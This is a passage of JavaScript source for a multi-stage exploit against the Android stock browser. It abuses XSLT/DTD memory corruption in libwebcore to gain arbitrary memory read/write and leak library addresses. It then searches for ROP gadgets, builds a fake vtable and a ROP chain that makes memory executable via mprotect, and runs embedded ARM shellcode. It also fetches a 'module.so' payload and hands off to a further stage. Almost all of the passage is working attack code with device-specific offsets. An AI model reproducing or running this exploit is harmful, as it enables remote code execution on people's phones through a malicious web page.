	    [newbase + 0x1a0 +  8, newbase + 0x800], // run4->name = "run"
	    [newbase + 0x1a0 + 12, newbase + 0x200], // run4->children = DTDoverwritename
	    [newbase + 0x1a0 + 24, base + 0x44],     // run4->next = link to stage 1 layout (->next)

	    // DTDoverwritename
	    [newbase + 0x200 +  4, 14],              // DTDoc->type = XML_DTD_NODE
	    [newbase + 0x200 + 24, page.base + 0x2000], // DTDoc->next = new name
	    [newbase + 0x200 + 28, elementaddr + 8 - 24], // DTDoc->prev = trashed->name - offset(next)

	    // Ensure that the new children node is 0
	    [page.base + 0x1000 +  4, 3],            // type = XML_TEXT_NODE
	    [page.base + 0x1000 + 24, 0],            // next
	    [page.base + 0x1000 + 20, 0],            // parent
	    [page.base + 0x1000 + 28, 0],            // prev
	    [page.base + 0x1000 + 40, 0],	     // content
	    [page.base + 0x1000 + 44, 0],	     // properties

	    // Ensure that the new name is 0
	    [page.base + 0x2000 +  4, 3],            // type = XML_TEXT_NODE
	    [page.base + 0x2000 + 24, 0],            // next
	    [page.base + 0x2000 + 20, 0],            // parent
	    [page.base + 0x2000 + 28, 0],            // prev
	    [page.base + 0x2000 + 40, 0],	     // content
	    [page.base + 0x2000 + 44, 0],	     // properties

	];

	layout.push.apply(layout, additions);
	page.apply_layout(layout);

	INFO("Stage2 layout applied.");

	XSL = '<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0" >' +
	    '<xsl:template match="run">' +
	    '  <xsl:apply-templates/>' +
	    '</xsl:template>' +
	    '<xsl:template match="ztX">' +
	    '  <xsl:if test="text()=ELZ">' +
	    '    <xsl:apply-templates/>' +
	    '    <xsl:message terminate="yes"/>' +
	    '  </xsl:if>' +
	    '</xsl:template>' +
	    '<xsl:template match="/*">' + 
	    '  <xsl:for-each select="namespace::*">' +
	    '    <xsl:if test="position() = 2">' +
	    '      <xsl:apply-templates />' +
	    '    </xsl:if>' + 
	    '  </xsl:for-each>' +
	    '</xsl:template>' +
	    '</xsl:stylesheet>';

	xsl = parseXML(XSL);
	processor = new XSLTProcessor();
	processor.importStylesheet(xsl);
	var result = processor.transformToDocument(xml2);

	// Search the second document address

	// XXX this is copy-pasted from above, might want to make a function
	var secondelementaddr = null;

	if (page.read(base + 0x12 + 30) !== 0) {
	    secondelementaddr = documentarea - 4;
	    INFO("Second trashed (1) XML_ELEMENT_NODE: " + secondelementaddr.toString(16));
	    if (ENABLE_DEBUG) {
		INFO("base + 0x12 + 30 = " + hex(page.read(base + 0x12 + 30), 8));
	    }
	}
	
	for (var i = 2; i <= 15; i++) {
	    var ztbase = base + i * 0x100;
	    if (page.read(ztbase + 0x12 + 30) !== 0) {
		if (secondelementaddr === null) {
		    secondelementaddr = documentarea - i * 4; // Exact address of the trashed XML_ELEMENT_NODE
		    INFO("Second trashed (loop " + i + ") XML_ELEMENT_NODE: " + secondelementaddr.toString(16));
		} else {
		    INFO("WARNING: undefined data trashed " + hex(documentarea - i*4));
		}
	    }
	}

    	var xsltobj = new XSLTObject(
    	    page, page.base + 0x1000,
    	    page.base + 0x2000, elementaddr, xml
    	);
	
    	// Perform a MemoryObject sanity check. Set and retrieve the document name.
    	var dname = "myawesomedocument";
    	xsltobj.set_root_name(dname);
	var gname = xsltobj.get_root_name();
    	if (gname != dname) {
    	    ERR("MemoryObject sanity check failed! " + gname);
    	}

    	INFO("MemoryObject created successfully.");

    	// Leak a libwebcore.so string
    	var children = xsltobj.read32(secondelementaddr + 12);
    	var webcoretext = xsltobj.read32(children + 8);
    	INFO("Leaked webcore address: " + webcoretext.toString(16));

    	// Dispose of the second element
    	xsltobj.zero(secondelementaddr + 8);
    	xsltobj.zero(secondelementaddr + 12);
    	xsltobj.zero(secondelementaddr + 40);

	stage2_overwrite(xsltobj, page, webcoretext);
	
	return;
    };

    document.body.appendChild(iframe2);

    INFO("Starting module download ...");
    var req = new XMLHttpRequest();
    // CHANGE MODULE NAME
    req.open("GET", "module.so", true);
    req.responseType = "arraybuffer";
    req.onreadystatechange = function(e) {
	if (req.readyState == 4) {
	    if (req.status == 200) {
		var content = req.response;

		if (content) {
		    INFO("Module downloaded. " + typeof(content));
		    window['g_module'] = new DataView(content);
		} else {
		    INFO("Could not download module");
		}
	    } else {
		window['g_module'] = null;
		INFO("Could not download module: server returned status " + req.status);
	    }
	}
    };
    req.send(null);
    

}

function stage2_overwrite(xsltobj, page, webcoretext) {
    
    var addr = page.base + 0x3000;
    var nobj = 0;
    var i;

    for (var cur = addr; cur < addr + 0x1000; cur += 0x40) {
	page.write(cur -  4, 16 | 3);
	page.write(cur +  4, 0x900d);
	page.write(cur + 16 - 4, (addr + 0x2000 | 3)); // lines up with *children
	                                               // so it needs to point to a DTD_NODE
	page.write(cur + 24, cur + 0x40);
	nobj += 1;
    }

    page.write(cur - 0x40 + 24, 0x0);
    page.write(addr + 0x2004, [0x00, 0x00, 0x00, 14]); // DTD_NODE

    xsltobj.free(addr);
    INFO("Array free() done. Addr = " + hex(addr) + " Cur = " + hex(cur));

    var arrays = [];

    for (i = 0; i < nobj * 3; i++) {
	arrays.push(new ArrayBuffer(0xbad));
    }

    for (var cur = addr; cur < addr + 0x1000; cur += 0x40) {
	if (page.read(cur + 4) == 0xbad) {
	    page.write(cur + 4, 0xffffffff);
	    page.write(cur + 8, 0x0);
	    INFO("Overwrite ArrayBuffer @" + cur.toString(16));
	    break;
	}

    }

    var buffer = null;
    for (i in arrays) {
	if (arrays[i].byteLength != 0xbad) {
	    INFO("arrays[" + i + "].byteLength = " + arrays[i].byteLength.toString(16));
	    buffer = arrays[i];
	    INFO("Found array (position: " + i + ")");
	    trk *= arrays[i].byteLength; // trk *= -1; trk = -0x44
	    break;
	}
    }

    if (buffer === null) {
	ERR("ArrayBuffer not found. The browser will most likely crash when the current tab is closed.");
    }
    var memobj = new BufferMemoryObject(buffer);

    // Prevent dlfree() from unmapping the current page. It will stay mapped
    // until the browser is closed.
    memobj.write32(page.base, 0x12ffffff, true);
    
    var nnodes = 0;
    for (cur = addr + 0x1000; cur < addr + 0x1ff0; cur += 0x40) {
    	page.write(cur -  4, 48 | 3);
    	page.write(cur +  4, 0x900d);
    	page.write(cur + 48 - 4, (addr + 0x2000 | 3));
    	page.write(cur + 24, cur + 0x40);
    	nnodes += 1;
    }

    page.write(cur - 0x40 + 24, 0x0);

    xsltobj.free(addr + 0x1000);
    INFO("Node free() done");

    var nodes = [];
    for (i = 0; i < nnodes * 3; i++) {
    	nodes.push(document.createTextNode("hello" + i));
    }

    // regular: size 0x33, type offset 36, string offset 40

    function find_node_30(start, end, increment) {
	var nodeaddr = null;
	var node = null;

	for (var cur = start; cur < end; cur += increment) {
	    if ((memobj.read32(cur - 4) == 0x33) && (memobj.read32(cur + 36) ==  0x580001)) {
		INFO("Overwrite WebCore::Text @ " + cur.toString(16));
		nodeaddr = cur;
		var m_data = memobj.read32(cur + 40);
		var stringdata = memobj.read32(m_data + 8);
		memobj.write8(stringdata, "W".charCodeAt(0));
		var vtable = memobj.read32(cur);
		break;
	    }
	}

	for (var i in nodes) {
	    if (nodes[i].nodeValue.slice(0, 1) == "W") {
		INFO("Found node (position: " + i + ")");
		node = nodes[i];
		break;
	    }
	}

	if (node === null || nodeaddr === null) {
	    return null;
	}

	return {obj:node, addr:nodeaddr, dataoffset:40};
    }

    //     htc: size 0x43, type offset 40, string offset 52
    //  huawei: size 0x43, type offset 36, string offset 48

    // HUAWEI Y530
    // 7a60014c: 00000043 53937b88 53937d1c 00000001
    // 7a60015c: 00000000 57030728 570b6318 00000000
    // 7a60016c: 00000000 00000000 00580001 00000000
    // 7a60017c: 00000000 7a6001a0 00000000 00000040
    // 7a60018c: 7a600003 00000000 00000000 00000000
    // 7a60019c: 0000002b 00000110 00000007 7a6001b4
    
    // HTC One
    // 7a3832dc: 00000043 6ad64188 6ad64334 00000001
    // 7a3832ec: 00000000 70dd8058 6ee7bb00 00000000
    // 7a3832fc: 00000000 00000000 00000000 00580001
    // 7a38330c: 00000000 00000000 7a383330 00000000
    // 7a38331c: 7a383003 00000000 00000000 00000000
    // 7a38332c: 0000002b 00000110 00000007 7a383344


    function find_node_40(start, end, increment) {
	var nodeaddr = null;
	var node = null;

	var dataoffset = null;

	for (var cur = start; cur < end; cur += increment) {
	    if (memobj.read32(cur - 4) == 0x43) {
		for (var i = 0; i < 0x10; i++) {
		    var value = memobj.read32(cur + i * 4);
		    if (value == 0x580001) {
			dataoffset = (i * 4) + 12;

			INFO("Overwrite WebCore::Text @ " + hex(cur));
			nodeaddr = cur;
			var m_data = memobj.read32(cur + dataoffset);

			if (m_data < 0x10000) {
			    INFO("find_node_40: Invalid data value for text node: " + hex(m_data, 8) +
				 " (type offset: " + i*4 + ", dataoffset: " + dataoffset);
			    return null;
			}
			var stringdata = memobj.read32(m_data + 8);
			memobj.write8(stringdata, "W".charCodeAt(0));
			var vtable = memobj.read32(cur);
			break;
		    }
		}
		break;
	    }
	}

	for (var i in nodes) {
	    if (nodes[i].nodeValue.slice(0, 1) == "W") {
		INFO("Found node (position: " + i + ")");
		node = nodes[i];
		break;
	    }
	}
	
	if (node === null || addr === null) {
	    return null;
	}

	return {obj:node, addr:nodeaddr, dataoffset:dataoffset};
    }

    var node = find_node_30(addr + 0x1000, addr + 0x2000, 0x40);

    if (node === null) {
	INFO("Node not found. Trying the alternate node data structure");
	
	// Some Android 4.3 versions have a different text node data structure which is 0x40 bytes long.

	nnodes = 0;
	for (cur = addr + 0x2100; cur < addr + 0x3000; cur += 0x50) {
    	    page.write(cur -  4, 0x40 | 3);
    	    page.write(cur +  4, 0x900d);
    	    page.write(cur + 24, cur + 0x50);
    	    page.write(cur + 0x40 - 4, (addr + 0x2000 | 3));
    	    nnodes += 1;
	}

	page.write(cur - 0x50 + 24, 0x0);

	xsltobj.free(addr + 0x2100);
	INFO("Retry node free() done");

	nodes = [];
	for (i = 0; i < nnodes * 3; i++) {
    	    nodes.push(document.createTextNode("hello" + i));
	}

	node = find_node_40(addr + 0x2100, addr + 0x3000, 0x50);
    }

    xsltobj.terminate();
    INFO("xsltobject removed");

    // From now on the browser won't crash if the tab is closed

    if (node === null) {
	if (ENABLE_DEBUG) {
	    INFO("The overwritten node object could not be found");
	    
	    INFO(" ");
	    INFO("-------- EXPLOIT ERROR -- DEBUG DUMP --------");
	    INFO(" ");
	    for (var cur = addr + 0x1000; cur < addr + 0x2000; cur += 0x40) {
		for (var ca = cur - 4; ca < cur + 0x40; ca +=16) {
		    INFO(hex(ca, 8) + ": " + hex(memobj.read32(ca), 8) + " " +
			 hex(memobj.read32(ca+4), 8) + " " +
			 hex(memobj.read32(ca+8), 8) + " " +
			 hex(memobj.read32(ca+12), 8));
		}

		INFO(" ");
	    }
	    INFO("---------------------------------------------");

	    for (var cur = addr + 0x2100; cur < addr + 0x3000; cur += 0x50) {
		for (var ca = cur - 4; ca < cur + 0x50; ca +=16) {
		    INFO(hex(ca, 8) + ": " + hex(memobj.read32(ca), 8) + " " +
			 hex(memobj.read32(ca+4), 8) + " " +
			 hex(memobj.read32(ca+8), 8) + " " +
			 hex(memobj.read32(ca+12), 8));
		}

		INFO(" ");
	    }

	    INFO("---------------------------------------------");
	}

	ERR("The overwritten node object could not be found");
    }

    stage3(memobj, webcoretext, node, addr, page);

}
    
// [ Stage 3 ] -------------------------------------------------------------- //

// Callstub to be filled at compile time
var CALLSTUB = [0xff, 0x40, 0x2d, 0xe9, 0x46, 0x4f, 0x8f, 0xe2, 0x00, 0x40, 0x94, 0xe5, 0x00, 0x50, 0x94, 0xe5, 0x00, 0x00, 0x55, 0xe3, 0x11, 0x00, 0x00, 0x0a, 0x04, 0x70, 0x94, 0xe5, 0x00, 0x00, 0x57, 0xe3, 0x04, 0x00, 0x00, 0x0a, 0x02, 0x70, 0xa0, 0xe3, 0x00, 0x00, 0x00, 0xef, 0x1c, 0x00, 0x84, 0xe5, 0x00, 0x00, 0x50, 0xe3, 0x34, 0x00, 0x00, 0x1a, 0x08, 0x00, 0x94, 0xe5, 0x0c, 0x10, 0x94, 0xe5, 0x10, 0x20, 0x94, 0xe5, 0x14, 0x30, 0x94, 0xe5, 0x18, 0x40, 0x94, 0xe5, 0x35, 0xff, 0x2f, 0xe1, 0xcc, 0x40, 0x8f, 0xe2, 0x00, 0x40, 0x94, 0xe5, 0x1c, 0x00, 0x84, 0xe5, 0x2a, 0x00, 0x00, 0xea, 0xc4, 0x50, 0x8f, 0xe2, 0x00, 0x50, 0x95, 0xe5, 0x00, 0x50, 0x84, 0xe5, 0x9c, 0x00, 0x8f, 0xe2, 0x00, 0x00, 0x90, 0xe5, 0x98, 0x40, 0x8f, 0xe2, 0x00, 0x40, 0x94, 0xe5, 0x94, 0x50, 0x8f, 0xe2, 0x00, 0x50, 0x95, 0xe5, 0x00, 0xd0, 0x90, 0xe5, 0x04, 0xd0, 0x4d, 0xe2, 0x00, 0x00, 0x9d, 0xe5, 0x04, 0x00, 0x50, 0xe1, 0xfb, 0xff, 0xff, 0x3a, 0x05, 0x00, 0x50, 0xe1, 0xf9, 0xff, 0xff, 0x2a, 0x20, 0xd0, 0x8d, 0xe2, 0x70, 0x40, 0x8f, 0xe2, 0x00, 0x40, 0x94, 0xe5, 0x6c, 0x50, 0x8f, 0xe2, 0x00, 0x50, 0x95, 0xe5, 0x08, 0x00, 0x9d, 0xe5, 0x04, 0x00, 0x50, 0xe1, 0x0b, 0x00, 0x00, 0x3a, 0x05, 0x00, 0x50, 0xe1, 0x09, 0x00, 0x00, 0x2a, 0x58, 0x00, 0x8f, 0xe2, 0x00, 0x00, 0x90, 0xe5, 0x01, 0x00, 0x50, 0xe3, 0x00, 0x00, 0x00, 0x0a, 0x30, 0x80, 0xbd, 0xe8, 0x40, 0xb0, 0x8f, 0xe2, 0x00, 0xb0, 0x9b, 0xe5, 0x30, 0x00, 0xbd, 0xe8, 0x74, 0x6a, 0x94, 0xe5, 0x04, 0xf0, 0x9d, 0xe4, 0x0c, 0x00, 0x9d, 0xe5, 0x04, 0x00, 0x50, 0xe1, 0x02, 0x00, 0x00, 0x3a, 0x05, 0x00, 0x50, 0xe1, 0x00, 0x00, 0x00, 0x2a, 0x70, 0x80, 0xbd, 0xe8, 0xf0, 0x80, 0xbd, 0xe8, 0xff, 0x80, 0xbd, 0xe8, 0x00, 0xdd, 0xda, 0xba, 0x01, 0xdd, 0xda, 0xba, 0x02, 0xdd, 0xda, 0xba, 0x03, 0xdd, 0xda, 0xba, 0x04, 0xdd, 0xda, 0xba, 0x05, 0xdd, 0xda, 0xba, 0x06, 0xdd, 0xda, 0xba, 0x07, 0xdd, 0xda, 0xba];

function stage3 (memobj, webcoretext, node, addr, page) {
    INFO("> [ Stage 3 ]");

    // Find libwebcore.so ELF header
    var webcore_base = memobj.findimagebase(webcoretext);
    INFO("Found libwebcore.so imagebase: " + webcore_base.toString(16));

    var libwebcore = new ELFObject(webcore_base, memobj);

    var fopen = libwebcore.findreloc("fopen");
    INFO("fopen address = " + fopen.toString(16));

    // Find libc base address
    var libcbase = memobj.findimagebase(fopen);
    INFO("libc base address: " + libcbase.toString(16));
    var libc = new ELFObject(libcbase, memobj);


    // [ Gadget search ] ---------------------------------------------------- //

    INFO("Searching gadgets ...");

    var gadgets = {};

    // Gadget 2 in libc

    //  BD 46                       MOV             SP, R7
    //  BD E8 B0 40                 POP.W           {R4,R5,R7,LR}
    //  03 B0                       ADD             SP, SP, #0xC
    //  70 47                       BX              LR

    gadgets.ggt2 = {addr: libc.findstring(
    	"\u46bd\ue8bd\u40b0\ub003\u4770", node
    )};

    if (gadgets.ggt2.addr === null) {
	INFO("Gadget 2 not found: trying alternate chain");
	stage3_alternate(memobj, node, addr, page, libwebcore, libc);
	return;
    }

    check_gadgets(gadgets);

    // Gadget 1 (in libwebcore)

    //  07 68                       LDR             R7, [R0]
    //   ?  ?                       LDR             R{reg}, [R7,#{disp}]
    //   ? 47                       BLX             R{reg}
    
    gadgets.ggt1 = gadget1_fastheur(libwebcore, node);
    
    if (gadgets.ggt1 === null) {
	INFO("fastheur failed");
	gadgets.ggt1 = gadget1_slowsearch(libwebcore, memobj, node);
    } else {
	INFO("Found Gadget 1 via fastheur");
    }
    
    check_gadgets(gadgets);

    //  61 60                       STR             R1, [R4,#4]
    //  10 BD                       POP             {R4,PC}

    gadgets.str_r1_r4 = {addr: libc.findstring(
	"\u6061\ubd10", node
    ), disp: 4};

    if (gadgets.str_r1_r4.addr === null) {
	// Alternate gadget

	//  21 60                       STR             R1, [R4]
	//  10 BD                       POP             {R4,PC}
	
	gadgets.str_r1_r4 = {addr: libc.findstring(
	    "\u6021\ubd10", node
	), disp: 0};
    }

    // If the libc search did not succeed try libwebcore

    if (gadgets.str_r1_r4.addr === null) {
	gadgets.str_r1_r4 = {addr: libwebcore.findstring(
	    "\u6021\ubd10", node
	), disp: 0};
    }

    if (gadgets.str_r1_r4.addr === null) {
	gadgets.str_r1_r4 = {addr: libwebcore.findstring(
	    "\u6061\ubd10", node
	), disp: 4};
    }

    check_gadgets(gadgets);

    //  01 80 BD E8                 LDMFD           SP!, {R0,PC}
    gadgets.pop_r0_pc = {addr: libc.findstring(
    	"\u8001\ue8bd", node
    )};
    
    check_gadgets(gadgets);

    //  3E BD                       POP             {R1-R5,PC}
    gadgets.pop_r1__r5_pc = {addr: libc.findstring(
    	"\ubd3e", node
    )};

    check_gadgets(gadgets);

    INFO("--- Gadget search completed --- ");

    if (ENABLE_DEBUG) {
	for (var name in gadgets) {
	    var extra = "";
	    for (var attr in gadgets[name]) {
		if (attr != "addr") {
		    extra += attr + ": " + gadgets[name][attr] + " ";
		}
	    }
	    if (extra !== "") {
		extra = "[ " + extra + "]";
	    }
	    INFO("  " + hex(gadgets[name].addr, 8) + " " + name + "  " + extra);
	}
    }

    // Create a fake vtable @ addr + 0x8000, fill it with gadget1
    var fakevtable = addr + 0x8000;
    for (var j = 0; j < 94; j++) {
    	memobj.write32(fakevtable + j * 4, gadgets.ggt1.addr + 1);
    	// memobj.write32(fakevtable + j * 4, 0x40404040);	
    }
 
    memobj.write32(fakevtable +  0, 0xba434343); // R4
    memobj.write32(fakevtable +  4, 0xba444444); // R5
    memobj.write32(fakevtable +  8, addr + 0x8400);         // R7 final ROP stack
    memobj.write32(fakevtable + 12, gadgets.ggt2.addr + 1); // LR    

    // Create a chain to ggt2
    memobj.write32(fakevtable + gadgets.ggt1.disp, gadgets.ggt2.addr + 1);

    // [ Final ROP Stack ] ---------------------------------------------------- //

    var mprotect = libc.findsymbol("mprotect");
    INFO("mprotect address: " + hex(mprotect));

    INFO("Stack will be written in " + hex(addr + 0x8300 + gadgets.str_r1_r4.disp));

    var ropstack = addr + 0x8400;

    var shellcode_addr = addr + 0xa000;
	
    var ropstack_content = [
	addr + 0x8300,              // R4 -- R1 will be copied here
	0xdeadbee5,                 // R5
	0xdeadbee7,                 // R7
	gadgets.str_r1_r4.addr + 1, // LR

	0xdeadbee0,                 // compensate for add sp, sp, #0xc in ggt2
	0xdeadbee4,
	0xdeadbee8,

	0xdeadbee4,                 // R4
	gadgets.pop_r0_pc.addr,     // PC

	page.base,                  // R0 -- addr
	gadgets.pop_r1__r5_pc.addr + 1, // PC

	page.size - 0x100,          // R1 -- size
	7,                          // R2 -- PROT_READ | PROT_WRITE | PROT_EXEC
	0,                          // R3
	ropstack + 4,               // R4 (trash values on this stack)
	0,                          // R5
	mprotect,                   // PC mprotect will return to lr (str_r1_r4, set by ggt2)
	                            // so R4 will need to be set to a dummy writable memory address

	0,                          // R4
	shellcode_addr,             // PC
    ];

    for (var i in ropstack_content) {
	memobj.write32(ropstack + i*4, ropstack_content[i]);
    }

    // [ Call stub ] ------------------------------------------------------------ //

    // Setup structfn where to store parameters, function addresses and return values
    
    var structfn = addr + 0x6000
    memobj.write32(structfn +  0, 0);
    memobj.write32(structfn +  4, 0);
    memobj.write32(structfn +  8, 0);
    memobj.write32(structfn + 12, 0);
    memobj.write32(structfn + 16, 0);
    memobj.write32(structfn + 20, 0);
    memobj.write32(structfn + 24, 0);
    memobj.write32(structfn + 28, 0);

    for (var i = 0; i < CALLSTUB.length; i++) {
	memobj.write8(shellcode_addr + i, CALLSTUB[i]);
    }

    // Check if this is one of those lucky phones that have a
    // SEPARATE v8 library
    var v8start = libwebcore.addr;
    var v8end = libwebcore.addr + libwebcore.size

    var v8enter = libwebcore.findreloc("_ZN2v87Context5EnterEv");
    if (v8enter !== null) {
	INFO("v8 is separate from libwebcore. Adjusting checks...");
	var v8 = memobj.findimagebase(v8enter);
	v8 = new ELFObject(v8, memobj);
	v8start = v8.addr;
	v8end = v8.addr + v8.size;
    }

    // Fill the variable shellcode words
    for (var i = 0; i < CALLSTUB.length/4; i++) {
	switch (memobj.read32(shellcode_addr + i*4)) {
	case 0xbadadd00:
	    memobj.write32(shellcode_addr + i*4, addr + 0x8300 + gadgets.str_r1_r4.disp);
	    break;
	case 0xbadadd01:
	    memobj.write32(shellcode_addr + i*4, libwebcore.addr);
	    break;
	case 0xbadadd02:
	    memobj.write32(shellcode_addr + i*4, libwebcore.addr + libwebcore.size);
	    break;
	case 0xbadadd03:
	    memobj.write32(shellcode_addr + i*4, v8start);
	    break;
	case 0xbadadd04:
	    memobj.write32(shellcode_addr + i*4, v8end);
	    break;
	case 0xbadadd05:
	    memobj.write32(shellcode_addr + i*4, structfn);
	    break;
	case 0xbadadd06:
	    memobj.write32(shellcode_addr + i*4, 0);
	    break;
	}
    }

    var vtable = memobj.read32(node.addr);

    // PC control (arbitrary address)
    // Replace the vtable
    memobj.write32(node.addr, fakevtable);

    // Call the function (yes this is a function call)
    node.obj.nodeValue = "x";
    
    // Put the vtable down, NAO
    memobj.write32(node.addr, vtable);

    INFO("Got out of function call. Building RCECall");

    var result = memobj.read32(structfn);
    memobj.write32(structfn, 0x0);

    var rce = new RCE(memobj, node, structfn, shellcode_addr, fakevtable);

    trk *= result;

    download_stage4(memobj, rce, libc, libwebcore, addr, trk);

    // -------------------------------------------------------------------------- //


}

function check_gadgets(gadgets) {
    for (var name in gadgets) {
	if (gadgets[name] === null || gadgets[name].addr === null) {
	    ERR("Cannot find gadget: " + name);
	}
    }
}

function gadget1_fastheur(libwebcore, node) {
    // 6807 LDR R7, [R0]
    // 687d LDR R5, [R7, #0x4]
    // 47a8 BLX R5

    var gadget_addr = libwebcore.findstring(
	"\u6807\u687d\u47a8", node, 0x200000
    );

    if (gadget_addr === null) return null;
    return {addr: gadget_addr, reg: 5, disp: 4};
}

function gadget1_slowsearch(libwebcore, memobj, node) {
    node.obj.nodeValue = "gadget1_slowsearch";
    var m_data = memobj.read32(node.addr + node.dataoffset);
    var oldaddr = memobj.read32(m_data + 8);
    var oldlen = memobj.read32(m_data + 4);
    
    memobj.write32(m_data + 8, libwebcore.addr);
    memobj.write32(m_data + 4, libwebcore.size/2);

    // Gadget 1

    // .text:0039F34A 07 68                       LDR             R7, [R0]
    // .text:0039F34C  ?  ?                       LDR             Rx, [R7,#y]
    // .text:0039F34E  ? 47                       BLX             Rx

    // LDR Rt, [Rn, #imm]
    // |15 14 13 12 11|10 09 08 07 06|05 04 03|02 01 00|
    // | 0  1  1  0  1|     imm5     |   Rn   |   Rt   |
    // imm = imm5 << 2
    
    // BLX Rm
    // |15 14 13 12 11 10 09 08 07|06 05 04 03|02 01 00|
    // | 0  1  0  0  0  1  1  1  1|    Rm     | 0  0  0|

    var searchindex = 0;

    while (true) {
	var candidateindex = node.obj.nodeValue.indexOf("\u6807", searchindex);
	if (candidateindex == -1) {
	    memobj.write32(m_data + 8, oldaddr);
	    memobj.write32(m_data + 4, oldlen);
	    return null;
	}
	searchindex = candidateindex + 1;
	var candidate = libwebcore.addr + candidateindex * 2;

	var i2 = memobj.read16(candidate + 2);
	if ((i2 & 0xf800) != 0x6800) continue;

	var i3 = memobj.read16(candidate + 4);
	if ((i3 & 0xff80) != 0x4780) continue;
	
	var imm = ((i2 >> 6) & 0x1f) << 2;
	var rn = (i2 >> 3) & 7;
	var rt = i2 & 7;

	var rm = (i3 >> 3) & 7;

	var i1 = memobj.read16(candidate);

	if (rn != 7) continue;
	if (rt != rm) continue;
	if (imm == 8 || imm == 12) continue; // reserved for ROP
	if (imm > 0x14 * 4 && imm < 0x30 * 4) continue; // reserved for vtable
	if (rt == 1 || rt == 7 || rt == 6) continue;

	if (ENABLE_DEBUG) {
	    INFO("Found Gadget 1 @ " +
		 hex(candidate) + " (" + hex(candidate - libwebcore.addr) + ")");

	    INFO("  \\x" + hex(memobj.read8(candidate + 0), 2) +
		 "\\x" + hex(memobj.read8(candidate + 1), 2) +
		 "\\x" + hex(memobj.read8(candidate + 2), 2) +
		 "\\x" + hex(memobj.read8(candidate + 3), 2) +
		 "\\x" + hex(memobj.read8(candidate + 4), 2) +
		 "\\x" + hex(memobj.read8(candidate + 5), 2));

	    INFO("  " + hex(i1, 4) + " LDR R7, [R0]");
	    INFO("  " + hex(i2, 4) + " LDR R" + rt + ", [R" + rn + ", #0x" + hex(imm) + "]");
	    INFO("  " + hex(i3, 4) + " BLX R" + rm);
	    INFO(" ");

	}


	memobj.write32(m_data + 8, oldaddr);
	memobj.write32(m_data + 4, oldlen);

	return {addr: candidate, reg: rt, disp: imm};
    }
}

// ARM gadgets variant of stage 3. Some lucky phones have more functions in libc
// and libwebcore compiled in ARM mode (32bit).
// Gadgets and the ROP stack are different for those phones.

function stage3_alternate(memobj, node, addr, page, libwebcore, libc) {
    var gadgets = {};

    // Gadget 2 in libc

    // .text:0001F988 08 D0 4B E2                 SUB             SP, R11, #8
    // .text:0001F98C 10 48 BD E8                 LDMFD           SP!, {R4,R11,LR}
    // .text:0001F990 0C D0 8D E2                 ADD             SP, SP, #0xC
    // .text:0001F994 1E FF 2F E1                 BX              LR

    gadgets.ggt2 = {addr: libc.findstring(
    	"\ud008\ue24b\u4810\ue8bd\ud00c\ue28d\uff1e\ue12f", node
    )};

    check_gadgets(gadgets);

    // Gadget 1 in libwebcore

    // .text:00443010 00 B0 90 E5                 LDR             R11, [R0]
    // .text:00443014 08 20 9B E5                 LDR             R2, [R11,#8]
    // .text:00443018 32 FF 2F E1                 BLX             R2

    gadgets.ggt1 = {addr: libwebcore.findstring(
    	"\ub000\ue590\u2008\ue59b\uff32\ue12f", node
    )};

    check_gadgets(gadgets);

    // str_r1_r4 in libwebcore
    // .text:000FD824 21 60                       STR             R1, [R4]
    // .text:000FD826 70 BD                       POP             {R4-R6,PC}

    gadgets.str_r1_r4 = {addr: libwebcore.findstring(
    	"\u6021\ubd70", node
    ), disp: 0};

    check_gadgets(gadgets);

    // .text:0001CF4C 01 80 BD E8                 LDMFD           SP!, {R0,PC}
    gadgets.pop_r0_pc = {addr: libc.findstring(
    	"\u8001\ue8bd", node
    )};
    
    check_gadgets(gadgets);

    // .text:00012B30 3E BD                       POP             {R1-R5,PC}
    
    gadgets.pop_r1__r5_pc = {addr: libwebcore.findstring(
    	"\ubd3e", node
    )};

    check_gadgets(gadgets);

    INFO("--- Gadget search completed --- ");

    if (ENABLE_DEBUG) {
	for (var name in gadgets) {
	    var extra = "";
	    for (var attr in gadgets[name]) {
		if (attr != "addr") {
		    extra += attr + ": " + gadgets[name][attr] + " ";
		}
	    }
	    if (extra !== "") {
		extra = "[ " + extra + "]";
	    }
	    INFO("  " + hex(gadgets[name].addr, 8) + " " + name + "  " + extra);
	}
    }

    // alert("Stage3 alternate ARM: gadget search completed");

    // Create a fake vtable @ addr + 0x8000, fill it with gadget1
    var fakevtable = addr + 0x8000;
    for (var j = 0; j < 94; j++) {
     	memobj.write32(fakevtable + j * 4, gadgets.ggt1.addr);
    	// memobj.write32(fakevtable + j * 4, 0x40404040);	
    }

    var ropstack = addr + 0x8400;
 
    memobj.write32(fakevtable -  8, 0xba434343);	// R4
    memobj.write32(fakevtable -  4, ropstack + 8);	// R11
    memobj.write32(fakevtable +  0, gadgets.ggt2.addr); // LR
    memobj.write32(fakevtable +  4, 0xba464646);
    memobj.write32(fakevtable +  8, gadgets.ggt2.addr); // chain to ggt2

    // [ Alternate ROP Stack ] ------------------------------------------------- //

    var mprotect = libc.findsymbol("mprotect");
    INFO("mprotect address: " + hex(mprotect));

    INFO("Stack will be written in " + hex(addr + 0x8300 + gadgets.str_r1_r4.disp));

    var shellcode_addr = addr + 0xa000;
	
    var ropstack_content = [
	addr + 0x8300,              // R4 -- R1 will be copied here
	0xdeadbee5,                 // R11
	gadgets.str_r1_r4.addr + 1, // LR

	0xdeadbee0,                 // compensate for add sp, sp, #0xc in ggt2
	0xdeadbee4,
	0xdeadbee8,

	0xdeadbee4,                 // R4
	0xdeadbee5,                 // R5
	0xdeadbee6,                 // R6
	gadgets.pop_r0_pc.addr,     // PC

	page.base,                  // R0 -- addr
	gadgets.pop_r1__r5_pc.addr + 1, // PC

	page.size - 0x100,          // R1 -- size
	7,                          // R2 -- PROT_READ | PROT_WRITE | PROT_EXEC
	0,                          // R3
	ropstack + 4,               // R4 (trash values on this stack)
	0,                          // R5
	mprotect,                   // PC mprotect will return to lr (str_r1_r4, set by ggt2)
	                            // so R4 will need to be set to a dummy writable memory address

	0xdeadbad4,                 // R4
	0xdeadbad5,                 // R5
	0xdeadbad6,                 // R6
	shellcode_addr,             // PC
    ];

    for (var i in ropstack_content) {
	memobj.write32(ropstack + i*4, ropstack_content[i]);
    }

    // [ Call stub ] ------------------------------------------------------------ //

    // Setup structfn where to store parameters, function addresses and return values
    
    var structfn = addr + 0x6000
    memobj.write32(structfn +  0, 0);
    memobj.write32(structfn +  4, 0);
    memobj.write32(structfn +  8, 0);
    memobj.write32(structfn + 12, 0);
    memobj.write32(structfn + 16, 0);
    memobj.write32(structfn + 20, 0);
